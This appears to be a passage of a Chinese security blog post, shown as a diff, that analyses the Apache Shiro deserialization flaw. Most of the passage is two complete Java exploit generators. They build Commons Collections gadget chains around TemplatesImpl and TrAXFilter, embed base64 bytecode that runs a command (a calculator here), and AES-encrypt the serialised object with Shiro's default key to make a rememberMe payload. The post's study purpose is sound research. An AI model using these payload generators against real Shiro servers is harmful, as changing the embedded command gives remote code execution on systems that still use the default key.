class="hljs-string">&quot;LWNhbGN1bGF0b3IMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0&quot;</span> +<br>                <span class="hljs-string">&quot;Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2&quot;</span> +<br>                <span class="hljs-string">&quot;YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhl&quot;</span> +<br>                <span class="hljs-string">&quot;YwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJ&quot;</span> +<br>                <span class="hljs-string">&quot;AAgACQACAAoAAAA3AAIAAQAAAAm7AAFZtwACV7EAAAACAAsAAAAKAAIAAAANAAgADgAMAAAADAAB&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAQAACAAEAAAAOKrcAA7gABBIFtgAGV7EA&quot;</span> +<br>                <span class="hljs-string">&quot;AAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4AEwAUAAAADwAAAAQAAQAQAAEAFQAW&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAWAAwAAAAgAAMAAAABABMAFAAAAAAAAQAX&quot;</span> +<br>                <span class="hljs-string">&quot;ABgAAQAAAAEAGQAaAAIADwAAAAQAAQAbAAEAFQAcAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAG&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAAAAbAAwAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHQAeAAIAAAABAB8AIAADAA8A&quot;</span> +<br>                <span class="hljs-string">&quot;AAAEAAEAGwABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        <span class="hljs-comment">//setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,templates);<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.clear();<br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        ByteSource payload = aes.encrypt(bytes, key);<br>        System.out.println(payload.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115235103394.png" srcset="/img/loading.gif" lazyload alt="image-20211115235103394"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115235253251.png" srcset="/img/loading.gif" lazyload alt="image-20211115235253251"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115234618480.png" srcset="/img/loading.gif" lazyload alt="image-20211115234618480"></p>
+<p>第二种：利用<code>TrAXFilter</code>类</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116000340086.png" srcset="/img/loading.gif" lazyload alt="image-20211116000340086"></p>
+<p>利用上面的反射调用它的构造方法</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png" srcset="/img/loading.gif" lazyload alt="image-20211115222331941"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplShiroCC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAEbWFpbgEAFihbTGphdmEv&quot;</span> +<br>                <span class="hljs-string">&quot;bGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh&quot;</span> +<br>                <span class="hljs-string">&quot;YmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zBwAqAQAGPGluaXQ+&quot;</span> +<br>                <span class="hljs-string">&quot;AQADKClWAQAEdGhpcwEAEkxvcmcvbGNkbTEyMy9FeGVjOwEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3Vt&quot;</span> +<br>                <span class="hljs-string">&quot;ZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +<br>                <span class="hljs-string">&quot;YWxpemF0aW9uSGFuZGxlcjsHACsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5h&quot;</span> +<br>                <span class="hljs-string">&quot;bC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJ&quot;</span> +<br>                <span class="hljs-string">&quot;dGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nlcmlh&quot;</span> +<br>                <span class="hljs-string">&quot;bGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJj&quot;</span> +<br>                <span class="hljs-string">&quot;ZUZpbGUBAAlFeGVjLmphdmEBABBvcmcvbGNkbTEyMy9FeGVjDAARABIHACwMAC0ALgEAEGdub21l&quot;</span> +<br>                <span class="hljs-string">&quot;LWNhbGN1bGF0b3IMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0&quot;</span> +<br>                <span class="hljs-string">&quot;Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2&quot;</span> +<br>                <span class="hljs-string">&quot;YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhl&quot;</span> +<br>                <span class="hljs-string">&quot;YwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJ&quot;</span> +<br>                <span class="hljs-string">&quot;AAgACQACAAoAAAA3AAIAAQAAAAm7AAFZtwACV7EAAAACAAsAAAAKAAIAAAANAAgADgAMAAAADAAB&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAQAACAAEAAAAOKrcAA7gABBIFtgAGV7EA&quot;</span> +<br>                <span class="hljs-string">&quot;AAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4AEwAUAAAADwAAAAQAAQAQAAEAFQAW&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAWAAwAAAAgAAMAAAABABMAFAAAAAAAAQAX&quot;</span> +<br>                <span class="hljs-string">&quot;ABgAAQAAAAEAGQAaAAIADwAAAAQAAQAbAAEAFQAcAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAG&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAAAAbAAwAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHQAeAAIAAAABAB8AIAADAA8A&quot;</span> +<br>                <span class="hljs-string">&quot;AAAEAAEAGwABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>));<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.clear();<br><br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        ByteSource payload = aes.encrypt(bytes, key);<br>        System.out.println(payload.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001116904.png" srcset="/img/loading.gif" lazyload alt="image-20211116001116904"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001047051.png" srcset="/img/loading.gif" lazyload alt="image-20211116001047051"></p>
+<p>对于 POC 还是需要去理解这几个方法的原理</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>P神的方法链中使用了 javassist 直接加载class文件，就不用再中途获取一遍 base64 编码。这个链子主要就是结合了一下 CC6 和 CC3，然后修改了调用方法不使用数组的方法了</p>
+<p>P神留下的几个注意点：</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001835882.png" srcset="/img/loading.gif" lazyload alt="image-20211116001835882"></p>
+<p>参考文章</p>
+<p>P神代码审计</p>
+<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
+<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1542">http://wjlshare.com/archives/1542</a></p>
+<p><a target="_blank" rel="noopener" href="https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/999">https://www.sec-in.com/article/999</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></p>
+<p><a target="_blank" rel="noopener" href="http://wh1sper.com/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/">http://wh1sper.com/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/16/Javassist/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Javassist</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/16/Java-CC3/">
+                        <span class="hidden-mobile">Java CC3</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
